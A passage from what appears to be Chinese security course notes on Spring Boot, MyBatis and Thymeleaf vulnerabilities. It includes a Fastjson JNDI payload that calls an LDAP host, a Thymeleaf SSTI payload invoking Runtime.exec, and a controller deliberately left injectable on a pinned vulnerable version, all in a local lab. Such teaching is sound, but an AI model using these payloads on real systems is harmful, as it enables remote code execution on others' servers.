src="/assets/image-20240717122230-lzxoxy5.png" alt="image">​</p><p> 4、提交JSON数据payload</p><p> <code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.88.142:1389/wnnjgr&quot;,&quot;autoCommit&quot;:true&#125;</code>​</p><p> <img src="/assets/image-20240717123020-2zwpq6n.png" alt="image">​</p><p> <img src="/assets/image-20240717122834-64swg8j.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="JavaEE应用-SpringBoot框架-MyBatis注入-Thymeleaf模版"><a href="#JavaEE应用-SpringBoot框架-MyBatis注入-Thymeleaf模版" class="headerlink" title="JavaEE应用&amp;SpringBoot框架&amp;MyBatis注入&amp;Thymeleaf模版"></a>JavaEE应用&amp;SpringBoot框架&amp;MyBatis注入&amp;Thymeleaf模版</h3><ol><li><p>SpringBoot框架搭建</p><p> 新建项目</p><p> 注意切换国内URL，这样导入库比较快</p><p> <img src="/assets/image-20240717195055-90ak8ya.png" alt="image">​</p><p> <img src="/assets/image-20240717195137-2y6x1sd.png" alt="image">​</p><p> 源码：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.xiaodisec.springboottest.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br><br><br>    <span class="hljs-comment">//指定GET请求的访问路由</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/xiaodiget&quot;,method = RequestMethod.GET)</span><br>    <span class="hljs-comment">//@GetMapping(&quot;/xiaodiget&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getindex</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;get test&quot;</span>;<br>    &#125;<br><br><br>    <span class="hljs-comment">//指定POST请求的访问路由</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/xiaodipost&quot;,method = RequestMethod.POST)</span><br>    <span class="hljs-comment">//@PostMapping(&quot;/xiaodipost&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getpost</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;post test&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//指定GET请求的访问路由 带参数名name</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/xiaodiget_g&quot;,method = RequestMethod.GET)</span><br>    <span class="hljs-comment">//@GetMapping(&quot;/xiaodiget&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get_g</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String name)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;get test&quot;</span>+name;<br>    &#125;<br><br>    <span class="hljs-comment">//指定POST请求的访问路由 带参数名name</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/xiaodipost_p&quot;,method = RequestMethod.POST)</span><br>    <span class="hljs-comment">//@GetMapping(&quot;/xiaodipost&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get_p</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String name)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;post test&quot;</span>+name;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p> 访问路由，这里只列出这一个，其余同理</p><p> ​<img src="/assets/image-20240717195305-bncrqrn.png" alt="image">​</p><p> 如果下方显示<code>IDEA卡在”正在解析Maven依赖项“的解决方法</code>​就按图示步骤查看是否配置正确，使用idea新建项目时，有时候会重置maven的配置，<a href="https://www.jb51.net/article/259780.htm">配置方法点这里</a></p><p> ​<img src="/assets/image-20240717195603-a6gkmf4.png" alt="image">​</p></li><li><p>MyBatis注入</p><p> 新建项目</p><p> <img src="/assets/image-20240717195941-gy4yuuz.png" alt="image">​</p><p> 注意，此时添加的依赖项与上面不同，多添加的依赖项会自动修改pom.xml中的内容，不用去<a href="https://mvnrepository.com/">Maven Repository: Search&#x2F;Browse&#x2F;Explore (mvnrepository.com)</a>上再找mysql和mybatis的驱动去添加</p><p> <img src="/assets/image-20240717200032-1xcpwv4.png" alt="image">​</p><p> 启动phpstudy的mysql服务</p><p> <img src="/assets/image-20240717200207-1oc460g.png" alt="image">​</p><p> 项目配置数据库连接信息，注意这里的application.yml的后缀是经过修改的，原本不是这个后缀</p><p> <img src="/assets/image-20240717200710-zussjhw.png" alt="image">​</p><p> 创建User类用来操作数据库数据</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.springbootmybatils.entity;<br><br><span class="hljs-comment">// 代表用户实体的实体类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String password;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Integer id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-comment">// 重写 toString() 以便于日志记录和调试</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, username=&#x27;&quot;</span> + username + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, password=&#x27;&quot;</span> + password + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 创建Mapper动态接口代理类实现</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.springbootmybatils.mapper;<br><br><span class="hljs-keyword">import</span> com.example.springbootmybatils.entity.User;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Insert;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Mapper;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br><br>    <span class="hljs-comment">// 根据提供的id选择所有用户的SQL查询</span><br>    <span class="hljs-meta">@Select(&quot;select * from admin &quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findAll</span><span class="hljs-params">(Integer id)</span>;<br><br>    <span class="hljs-comment">// 根据特定id选择所有用户的SQL查询</span><br>    <span class="hljs-meta">@Select(&quot;select * from admin where id=1&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">findID</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> 创建Controller实现Web访问调用</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.springbootmybatils.controller;<br><br><span class="hljs-keyword">import</span> com.example.springbootmybatils.entity.User;<br><span class="hljs-keyword">import</span> com.example.springbootmybatils.mapper.UserMapper;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetadminController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> UserMapper UserMapper;<br><br>    <span class="hljs-comment">// 根据用户id检索管理员数据的端点</span><br>   <span class="hljs-meta">@GetMapping(&quot;/getadmin&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getadmindata</span><span class="hljs-params">()</span>&#123;<br>        List&lt;User&gt; all = UserMapper.findAll();<br>        <span class="hljs-keyword">return</span> all;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/getid&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getadminid</span><span class="hljs-params">()</span>&#123;<br>        List&lt;User&gt; all = UserMapper.findID();<br>        <span class="hljs-keyword">return</span> all;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p> 文件目录如下</p><p> <img src="/assets/image-20240717201100-ftj3nic.png" alt="image">​</p><p> <img src="/assets/image-20240717201433-pc8tskj.png" alt="image">​</p><p> <strong>测试注入</strong></p><p> <img src="/assets/image-20240717201601-szf1fxs.png" alt="image">​</p><p> <img src="/assets/image-20240717201612-hczpzfz.png" alt="image">​</p><p> 代码存在漏洞</p><p> <img src="/assets/image-20240717201846-l6qq6k2.png" alt="image">​</p><p> <img src="/assets/image-20240717201853-1xyzzh2.png" alt="image">​</p><p> <img src="/assets/image-20240717201639-im931x4.png" alt="image">​</p></li><li><p>Thymeleaf模版注入漏洞</p><p> <img src="/assets/image-20240717201939-nqos9s6.png" alt="image">​</p><p> 1、新建项目</p><p> <img src="/assets/image-20240717202027-3007tdc.png" alt="image">​</p><p> <img src="/assets/image-20240717202037-haia2ol.png" alt="image">​</p><p> 2、使用模板渲染，必须在resources目录下创建templates存放html文件</p><p> <img src="/assets/image-20240717202304-wm3fiah.png" alt="image">​</p><p> index.html</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;data&#125;&quot;</span>&gt;</span>小迪安全<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p> test.html</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xiaodi<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>xiaodisec<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p> 3、创建Controller实现Web访问调用</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.xiaodisec.thyremeafdemo.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThyremeafController</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(Model model)</span> &#123;<br>        model.addAttribute(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;hello xiaodi&quot;</span>);<br>        <span class="hljs-comment">//@RestController 自带ResponseBody index当做字符串显示操作</span><br>        <span class="hljs-comment">//Controller 没有ResponseBody index当做资源文件去渲染</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/test&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//@RestController ResponseBody index当做字符串显示操作</span><br>        <span class="hljs-comment">//Controller 没有ResponseBody index当做资源文件去渲染</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>    &#125;<br><br><span class="hljs-comment">//    @RequestMapping(value = &quot;/&quot;)</span><br><span class="hljs-comment">//    public String index(@RequestParam String lang) &#123;</span><br><span class="hljs-comment">//        //@RestController ResponseBody index当做字符串显示操作</span><br><span class="hljs-comment">//        //Controller 没有ResponseBody index当做资源文件去渲染</span><br><span class="hljs-comment">//        return lang; //lang=en index-en</span><br><span class="hljs-comment">//    &#125;</span><br><br><br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>安全问题：</strong></p><p> 日常开发中：语言切换页面，主题更换等传参导致的SSTI注入安全问题</p><p> 例如：更换中英文页面模板</p><p> ​<img src="/assets/image-20240717202710-9ac9bi5.png" alt="image">​</p><p> ​<img src="https://img-blog.csdnimg.cn/img_convert/ecb6fc545b7ec5c193ba401fa20cd89f.png" alt="Untitled">​</p><p> 4、创建如下的控制器实现Web访问调用，和渲染模板文件<br> ThyremeafController .java</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-comment">//@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThyremeafController</span> &#123;<br><br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-comment">//@RestController ResponseBody index当做字符串显示操作</span><br>        <span class="hljs-comment">//Controller 没有ResponseBody index当做资源文件去渲染</span><br>        <span class="hljs-keyword">return</span> lang; <span class="hljs-comment">//lang=en index-en</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p> index-en.html</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p> 5、启动项目，并输入对应路由访问，指向渲染文件的文件名<code>?lang=index-en http://127.0.0.1:8080/?lang=index-en</code>​</p><p> ​<img src="/assets/image-20240717203059-ankqbud.png" alt="image">​</p><p> 6、替换为注入<code>http://127.0.0.1:8080/?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x</code>​发现报错</p><p> ​<img src="/assets/image-20240717203250-otucqfy.png" alt="image">​</p><p> 原因：Thymeleaf版本问题</p><p> 7、替换pom.xml整个文件，到对应的漏洞版本再次注入</p><p> 存在漏洞的版本的pom.xml</p><p> ​<img src="/assets/image-20240717203517-5z5gda4.png" alt="image">​</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-spring-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--latest--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.0.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p> ​<img src="/assets/image-20240717204230-nmvprj7.png" alt="image">​</p><p> 正常的pom.xml（这里只是用版本作为一个比较，代码其他内容肯定也不一样）</p><p> ​<img src="/assets/image-20240717203604-yyntmdj.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="JavaEE应用-SpringBoot框架-Actuator监控泄漏-Swagger自动化"><a href="#JavaEE应用-SpringBoot框架-Actuator监控泄漏-Swagger自动化" class="headerlink" 